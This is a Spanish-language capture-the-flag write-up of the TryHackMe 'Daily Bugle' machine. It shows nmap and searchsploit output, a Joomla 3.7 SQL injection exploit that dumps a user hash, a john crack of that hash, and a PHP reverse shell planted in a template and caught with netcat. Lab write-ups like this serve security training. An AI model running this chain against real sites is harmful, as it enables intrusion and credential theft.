# Daily Bugle

![image](https://github.com/JoseVazquez101/Writteups/assets/111292579/682e0484-03da-44d6-85ec-26971c4c2168)

***
- Source: https://tryhackme.com/room/dailybugle
- OS: Linux
- Dificultad: Hard
- IP: No estática
- Temas: ``CMS``, ``Joomla``, `Sqli`, `Linux PrivEsc`.
***

~~~bash
┌──(kali💀Dedsec)-[~/Maquinas/Linux/Dayly_Bugle]
└─$ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -sV 10.10.19.253
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94 ( https://nmap.org ) at 2024-02-16 19:34 EST
NSE: Loaded 46 scripts for scanning.
Initiating SYN Stealth Scan at 19:34
Scanning 10.10.19.253 [65535 ports]
Discovered open port 3306/tcp on 10.10.19.253
Discovered open port 22/tcp on 10.10.19.253
Discovered open port 80/tcp on 10.10.19.253
Completed SYN Stealth Scan at 19:35, 24.95s elapsed (65535 total ports)
Initiating Service scan at 19:35
Scanning 3 services on 10.10.19.253
Completed Service scan at 19:35, 11.83s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.19.253.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 19:35
Completed NSE at 19:35, 1.03s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 19:35
Completed NSE at 19:35, 1.18s elapsed
Nmap scan report for 10.10.19.253
Host is up, received user-set (0.51s latency).
Scanned at 2024-02-16 19:35:00 EST for 39s
Not shown: 39102 filtered tcp ports (no-response), 26430 closed tcp ports (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 61 OpenSSH 7.4 (protocol 2.0)
80/tcp   open  http    syn-ack ttl 61 Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
3306/tcp open  mysql   syn-ack ttl 61 MariaDB (unauthorized)

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.37 seconds
           Raw packets sent: 121003 (5.324MB) | Rcvd: 27783 (1.111MB)

~~~

- Si vamos a la ruta `http://10.10.19.253/administrator/manifests/files/joomla.xml` podemos ver algunas rutas:

~~~xml
<fileset>
<files>
<folder>administrator</folder>
<folder>bin</folder>
<folder>cache</folder>
<folder>cli</folder>
<folder>components</folder>
<folder>images</folder>
<folder>includes</folder>
<folder>language</folder>
<folder>layouts</folder>
<folder>libraries</folder>
<folder>media</folder>
<folder>modules</folder>
<folder>plugins</folder>
<folder>templates</folder>
<folder>tmp</folder>
<file>htaccess.txt</file>
<file>web.config.txt</file>
<file>LICENSE.txt</file>
<file>README.txt</file>
<file>index.php</file>
</files>
</fileset>
~~~

- Por ahora enumeraremos solo la versión, pues no hay nada interesante más allá del login de administrador.
- Podemos encontrarla en `http://10.10.19.253/language/en-GB/en-GB.xml`:

~~~xml
<metafile version="3.7" client="site">
<name>English (en-GB)</name>
<version>3.7.0</version>
<creationDate>April 2017</creationDate>
<author>Joomla! Project</author>
<authorEmail>admin@joomla.org</authorEmail>
<authorUrl>www.joomla.org</authorUrl>
<copyright>
Copyright (C) 2005 - 2017 Open Source Matters. All rights reserved.
</copyright>
<license>
GNU General Public License version 2 or later; see LICENSE.txt
</license>
<description>en-GB site language</description>
<metadata>
<name>English (en-GB)</name>
<nativeName>English (United Kingdom)</nativeName>
<tag>en-GB</tag>
<rtl>0</rtl>
<locale>
en_GB.utf8, en_GB.UTF-8, en_GB, eng_GB, en, english, english-uk, uk, gbr, britain, england, great britain, uk, united kingdom, united-kingdom
</locale>
<firstDay>0</firstDay>
<weekEnd>0,6</weekEnd>
<calendar>gregorian</calendar>
</metadata>
<params/>
</metafile>
~~~


- Si filtramos por la versión en `searchsploit` podemos ver un exploit que sin duda luce prometedor:

~~~bash 
┌──(kali💀Dedsec)-[~/Maquinas/Linux/Dayly_Bugle]
└─$ searchsploit joomla 3.7
------------------------------------------- ---------------------------------
 Exploit Title                             |  Path
------------------------------------------- ---------------------------------
Joomla! 3.7 - SQL Injection                | php/remote/44227.php
~~~

- El exploit nos dice que es posible realizar una inyección a la base de datos a través de la url `http://10.10.19.253/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=1`
- Donde se nos permitirá añadir parámetros para obtener información de usuarios.
- La máquina nos invita a hacer el ataque con un exploit de ython, busqué y encontré este: https://github.com/stefanlucas/Exploit-Joomla/blob/master/joomblah.py
- Ahora bien, nos arroja un hash que podemos romper:

~~~bash
┌──(kali💀Dedsec)-[~/Maquinas/Linux/Dayly_Bugle]
└─$ python3 joomblah.py http://10.10.19.253
                                                                                                                    
    .---.    .-'''-.        .-'''-.                                                           
    |   |   '   _    \     '   _    \                            .---.                        
    '---' /   /` '.   \  /   /` '.   \  __  __   ___   /|        |   |            .           
    .---..   |     \  ' .   |     \  ' |  |/  `.'   `. ||        |   |          .'|           
    |   ||   '      |  '|   '      |  '|   .-.  .-.   '||        |   |         <  |           
    |   |\    \     / / \    \     / / |  |  |  |  |  |||  __    |   |    __    | |           
    |   | `.   ` ..' /   `.   ` ..' /  |  |  |  |  |  |||/'__ '. |   | .:--.'.  | | .'''-.    
    |   |    '-...-'`       '-...-'`   |  |  |  |  |  ||:/`  '. '|   |/ |   \ | | |/.'''. \   
    |   |                              |  |  |  |  |  |||     | ||   |`" __ | | |  /    | |   
    |   |                              |__|  |__|  |__|||\    / '|   | .'.''| | | |     | |   
 __.'   '                                              |/'..' / '---'/ /   | |_| |     | |   
|      '                                               '  `'-'`       \ \._,\ '/| '.    | '.  
|____.'                                                                `--'  `" '---'   '---' 

 [-] Fetching CSRF token
 [-] Testing SQLi
  -  Found table: fb9j5_users
  -  Extracting users from fb9j5_users
 [$] Found user ['811', 'Super User', 'jonah', 'jonah@tryhackme.com', '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm', '', '']
  -  Extracting sessions from fb9j5_session
~~~

- Lo guardamos y utilizamos ``john``, tardará aproximadamente 5 minutos:

~~~bash
┌──(kali💀Dedsec)-[~/Maquinas/Linux/Dayly_Bugle]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash                         
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
spiderman123     (jonah)     
1g 0:00:06:05 DONE (2024-02-16 22:01) 0.002737g/s 128.2p/s 128.2c/s 128.2C/s tiffany3..spider123
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
~~~

- Iniciamos sesión y nos dirigimos a `Templates ---> error.php`

![image](https://github.com/JoseVazquez101/Writteups/assets/111292579/22b9a417-5d00-46b3-a508-5eda7de69214)

- Añadimos una revshell ejecutada en php:

![image](https://github.com/JoseVazquez101/Writteups/assets/111292579/ad109800-6157-4bfb-a833-9fa804df84af)


- Ahora solo debemos visitar `http://10.10.19.253/index.php/<>` y deberíamos entablar una conexión:

~~~bash
┌──(kali💀Dedsec)-[~/Maquinas/Linux/Dayly_Bugle]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.2.60.167] from (UNKNOWN) [10.10.19.253] 41870
bash: no job control in this shell
bash-4.2$ id
id
uid=48(apache) gid=48(apache) groups=48(apache)
~~~

- Realizamos un tratamiento de TTY:


